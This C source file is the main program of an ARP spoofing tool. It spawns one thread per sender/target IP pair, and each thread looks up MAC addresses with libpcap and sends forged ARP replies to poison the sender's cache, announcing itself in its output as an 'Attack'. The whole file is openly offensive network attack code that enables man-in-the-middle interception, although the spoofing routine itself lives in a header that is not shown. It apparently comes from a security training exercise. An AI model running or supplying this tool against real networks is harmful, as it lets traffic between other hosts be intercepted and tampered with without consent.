#include "arp_spoof.h"

int main(int argc, char** argv){
    uint32_t i;
    uint32_t ret;
    pthread_t thread[MAX_THREAD_NUM];
    struct Pdata data[MAX_THREAD_NUM];
    /* check args */
    if(argc < 4 || argc & 1 || argc > MAX_THREAD_NUM*2){
        printf("usage : %s <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n",argv[0]);
        return -1;
    }
    printf("%d\n",argc);
    for(i=0; i * 2 + 2 < argc ;i++){
        data[i].idx = i;
        data[i].dev = argv[1];
        data[i].SenderIP = argv[2 + i*2];
        data[i].TargetIP = argv[3 + i*2];

        printf("%d\n",i);
        if(pthread_create(&thread[i], NULL, &thread_main, (void *)&data[i])){
            fprintf(stderr, "Couldn't make Thread %d\n",i);
            return -1;
        }
        printf("Thread %d start\n",i);
    }

    printf("Thread running...\n");

    while(1);


}

void* thread_main(void* arg){
    pcap_t *handle;   /* Session handle */
    char *dev;  /* device to communication */
    char errbuf[PCAP_ERRBUF_SIZE];  /* Error string */
    struct ether_addr LocalMac;   /* my mac address */
    struct ether_addr TargetMac;
    struct ether_addr SenderMac;
    struct in_addr LocalIP, SenderIP, TargetIP;
    struct Pdata* data = (struct Pdata*)arg;
    /* check arguments are IP format */
    if(inet_pton(AF_INET, data->SenderIP, &SenderIP) != 1){
        return -1;
    }
    if(inet_pton(AF_INET, data->TargetIP, &TargetIP) != 1){
        return -1;
    }
    /* Define device */
    dev = data->dev;

    printf("**********************************\n");
    printf("Spoofing Program Start!!\n");
    printf("Interface is %s\n",dev);
    printf("Sender IP is %s\n",inet_ntoa(SenderIP));
    printf("Target IP is %s\n",inet_ntoa(TargetIP));

    /* Open session in promiscuous mode */
    if( (handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf)) == NULL){
        fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
        return 2;
    }
    /* Get Local IP addr */
    if(GetLocalIP(dev, &LocalIP) != EXIT_SUCCESS){
        fprintf(stderr, "Couldn't get IPv4\n");
        return 2;
    }

    printf("Local IP is %s\n",inet_ntoa(LocalIP));

    printf("**********************************\n");
    printf("Get Local Mac Address...\n");

    /* Get Local Mac Address */
    if(GetLocalMac(dev, &LocalMac) != EXIT_SUCCESS){
        fprintf(stderr, "Couldn't Get local Mac Address\n");
        return 2;
    }

    printf("Success!!\n");
    printf("Local Mac Address is %s\n",ether_ntoa(&LocalMac));

    printf("**********************************\n");
    printf("Get Sender, Target Mac Address...\n");

    /* Get Sender Mac Address */
    if(GetSenderMac(handle, LocalMac, LocalIP, SenderIP, &SenderMac) != EXIT_SUCCESS){
        fprintf(stderr, "Couldn't Get Sender Mac Address\n");
        return 2;
    }

    /* Get Target Mac Address */
    if(GetSenderMac(handle, LocalMac, LocalIP, TargetIP, &TargetMac) != EXIT_SUCCESS){
        fprintf(stderr, "Couldn't Get Target Mac Address\n");
        return 2;
    }

    printf("Sender Mac Address is %s\n",ether_ntoa(&SenderMac));
    printf("Target Mac Address is %s\n",ether_ntoa(&TargetMac));
    printf("**********************************\n");
    printf("Attack Start\n");
    printf("Generate Arp Reply Packet %s is at %s\n",inet_ntoa(TargetIP), ether_ntoa(&LocalMac));

    /* Generate Fake Arp Reply Packet and send */
    if(ArpSpoof(handle,SenderMac,LocalMac,TargetIP, TargetMac, SenderIP) != EXIT_SUCCESS){
        fprintf(stderr, "Couldn't Attack\n");
        return 2;
    }

    printf("Done!\n");
    return 0;
}

